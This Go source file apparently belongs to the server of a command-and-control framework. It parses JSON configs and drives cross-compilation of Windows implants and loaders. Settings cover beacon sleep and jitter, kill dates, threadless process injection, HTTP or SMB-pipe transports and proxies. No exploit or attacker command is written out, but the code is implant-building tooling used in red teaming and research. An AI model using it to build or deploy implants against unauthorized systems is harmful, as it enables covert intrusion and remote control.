package core

import (
	"encoding/json"
	"errors"
	"fmt"
	"hexane_server/cmd"
	"os"
	"strconv"
	"strings"
)

var StringsList = []string{
	"crypt32",
	"winhttp",
	"advapi32",
	"iphlpapi",
}

var (
	Fstat = os.O_WRONLY | os.O_CREATE | os.O_TRUNC

	Logs        = RootDirectory + "logs"
	PayloadPath = RootDirectory + "payload"
	StringsFile = RootDirectory + "configs/strings.txt"
	HashHeader  = RootDirectory + "core/include/names.hpp"
	RsrcScript  = RootDirectory + "loader/resource.rc"
	LoadersCpp  = RootDirectory + "loader/loaders.cpp"
	LoaderDll   = RootDirectory + "loader/DllMain.cpp"
	MainExe     = RootDirectory + "core/implant/MainExe.cpp"
	Ld          = RootDirectory + "implant/linker.implant.ld"
)

func (h *HexaneConfig) GetEmbededStrings() []string {
	var EmbededStrings = []string{
		string(h.Key),
	}

	for _, str := range StringsList {
		EmbededStrings = append(EmbededStrings, str)
	}

	return EmbededStrings
}

func (h *HexaneConfig) GetLoaderComponents() []string {
	return []string{
		LoaderDll,
		h.Compiler.BuildDirectory + "/loader.asm.o",
		h.Compiler.BuildDirectory + "/loaders.cpp.o",
		h.Compiler.BuildDirectory + "/resource.res",
	}
}

func (h *HexaneConfig) CreateConfig(jsonCfg JsonConfig) error {
	var err error

	h.Compiler = new(CompilerConfig)
	h.Implant = new(ImplantConfig)

	h.BuildType = jsonCfg.Config.BuildType

	switch h.BuildType {
	case "bin":
		{
			h.Compiler.FileExtension = ".bin"
		}
	case "dll":
		{
			h.Compiler.FileExtension = ".dll"
		}
	case "exe":
		{
			h.Compiler.FileExtension = ".exe"
		}
	default:
		return fmt.Errorf("unkown build type. Exiting")
	}

	WrapMessage("INF", fmt.Sprintf("generating config for %s", h.Compiler.FileExtension))

	h.ImplantName = jsonCfg.ImplantName
	h.Compiler.BuildDirectory = fmt.Sprintf("../payload/%s", strings.TrimSuffix(h.ImplantName, h.Compiler.FileExtension))

	h.Compiler.Debug = jsonCfg.Config.Debug
	h.Compiler.Arch = jsonCfg.Config.Arch
	h.Compiler.Mingw = "/usr/bin/x86_64-w64-mingw32-g++"
	h.Compiler.Linker = "/usr/bin/x86_64-w64-mingw32-ld"
	h.Compiler.Objcopy = "/usr/bin/x86_64-w64-mingw32-objcopy"
	h.Compiler.RsrcCompiler = "/usr/bin/x86_64-w64-mingw32-windres"
	h.Compiler.Strip = "/usr/bin/x86_64-w64-mingw32-strip"
	h.Compiler.Assembler = "/usr/bin/nasm"

	h.Compiler.IncludeDirs = []string{
		"../core/include",
	}

	h.Compiler.ComponentDirs = []string{
		"../core/src",
		"../implant",
	}

	h.Implant.LoadedModules = []string{
		"crypt32",
		"winhttp",
		"advapi32",
		"iphlpapi",
		".reloc",
	}

	if jsonCfg.Config.Debug {
		h.Compiler.Flags = []string{
			"",
			"-std=c++23",
			"-g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1",
			"-Wl,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	} else {
		h.Compiler.Flags = []string{
			"",
			"-std=c++23",
			"-Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-s -ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1",
			"-Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	}

	return err
}

func ReadConfig(cfgName string) error {
	var (
		hexane   = new(HexaneConfig)
		jsonCfg JsonConfig
		buffer []byte
		err error
	)

	WrapMessage("INF", fmt.Sprintf("loading %s", cfgName))

	if buffer, err = os.ReadFile(RootDirectory + "configs/" + cfgName); err != nil {
		return err
	}

	if err = json.Unmarshal(buffer, &jsonCfg); err != nil {
		return err
	}

	if err = hexane.CreateConfig(jsonCfg); err != nil {
		return err
	}

	hexane.Implant.EgressPeer = jsonCfg.Config.EgressPeer
	if hexane.Implant.EgressPeer != "" {
		hexane.GroupId = GetGIDByPeerName(hexane.Implant.EgressPeer)

	} else {
		cmd.Payloads.Group++
		hexane.GroupId = cmd.Payloads.Group
	}

	hexane.Implant.PeerId = GeneratePeerId()

	hexane.Implant.Sleeptime = uint32(jsonCfg.Config.Sleeptime)
	hexane.Implant.Jitter = uint32(jsonCfg.Config.Jitter)
	hexane.Implant.Domain = jsonCfg.Network.Domain

	if hexane.Implant.Hostname = jsonCfg.Config.Hostname; hexane.Implant.Hostname == "" {
		return fmt.Errorf("a hostname must be provided")
	}

	hexane.Implant.Injection = new(Injection)
	if jsonCfg.Injection.Threadless != nil {
		hexane.Implant.Injection.Threadless = new(Threadless)
		hexane.Implant.Injection.Threadless.ModuleName = jsonCfg.Injection.Threadless.ModuleName + string(byte(0x00))
		hexane.Implant.Injection.Threadless.ProcName = jsonCfg.Injection.Threadless.ProcName + string(byte(0x00))
		hexane.Implant.Injection.Threadless.FuncName = jsonCfg.Injection.Threadless.FuncName + string(byte(0x00))
		hexane.Implant.Injection.Threadless.LdrExecute = jsonCfg.Injection.Threadless.LdrExecute
	}

	if jsonCfg.Network.ProfileType == "http" {

		hexane.Implant.Profile = new(HttpConfig)
		hexane.Implant.ProfileTypeId = TRANSPORT_HTTP

		profile := hexane.Implant.Profile.(*HttpConfig)
		profile.Address = jsonCfg.Network.Address
		profile.Port = jsonCfg.Network.Port
		profile.Useragent = jsonCfg.Network.Useragent

		if jsonCfg.Network.Port < 1 || jsonCfg.Network.Port > 65535 {
			return fmt.Errorf("port number must be between 1 - 65535")
		}

		profile.Endpoints = make([]string, 0, len(jsonCfg.Network.Endpoints))
		profile.Endpoints = append(profile.Endpoints, jsonCfg.Network.Endpoints...)

		hexane.Proxy = new(ProxyConfig)

		if jsonCfg.Network.Proxy.Enabled {
			if jsonCfg.Network.Proxy.Port < 1 || jsonCfg.Network.Proxy.Port > 65535 {
				return errors.New("proxy port number must be between 1 - 65535")
			}

			hexane.Implant.ProxyBool = true
			hexane.Proxy.Proto = "http://"
			hexane.Proxy.Address = jsonCfg.Network.Proxy.Address
			hexane.Proxy.Port = strconv.Itoa(jsonCfg.Network.Proxy.Port)
		}
	} else if jsonCfg.Network.ProfileType == "smb" {

		hexane.Implant.ProfileTypeId = TRANSPORT_PIPE
		hexane.Implant.EgressPipe = GenerateUuid(24)
	}

	hexane.UserSession = cmd.Session
	return hexane.RunBuild()
}

func (h *HexaneConfig) PePatchConfig() ([]byte, error) {
	var (
		hStream = CreateStream()
		Hours   int32
		err     error
	)

	if Hours, err = ParseWorkingHours(h.Implant.WorkingHours); err != nil {
		return nil, err
	}

	hStream.AddString(h.Implant.Hostname)
	hStream.AddString(h.Implant.Domain)
	hStream.AddDword(h.Implant.PeerId)
	hStream.AddDword(h.Implant.Sleeptime)
	hStream.AddDword(h.Implant.Jitter)
	hStream.AddInt32(Hours)
	hStream.AddDword64(h.Implant.Killdate)

	switch h.Implant.ProfileTypeId {
	case TRANSPORT_HTTP:
		{
			var httpCfg = h.Implant.Profile.(*HttpConfig)

			hStream.AddWString(httpCfg.Useragent)
			hStream.AddWString(httpCfg.Address)
			hStream.AddDword(uint32(httpCfg.Port))

			if len(httpCfg.Endpoints) == 0 {
				hStream.AddDword(1)
				hStream.AddWString("/")

			} else {
				hStream.AddDword(uint32(len(httpCfg.Endpoints)))
				for _, uri := range httpCfg.Endpoints {
					hStream.AddWString(uri)
				}
			}
			if h.Implant.ProxyBool {
				var proxyUrl = fmt.Sprintf("%v://%v:%v", h.Proxy.Proto, h.Proxy.Address, h.Proxy.Port)

				hStream.AddDword(1)
				hStream.AddWString(proxyUrl)
				hStream.AddWString(h.Proxy.Username)
				hStream.AddWString(h.Proxy.Password)

			} else {
				hStream.AddDword(0)
			}

			break
		}
	case TRANSPORT_PIPE:
		{
			hStream.AddWString(h.Implant.EgressPipe)
		}
	}
	return hStream.Buffer, err
}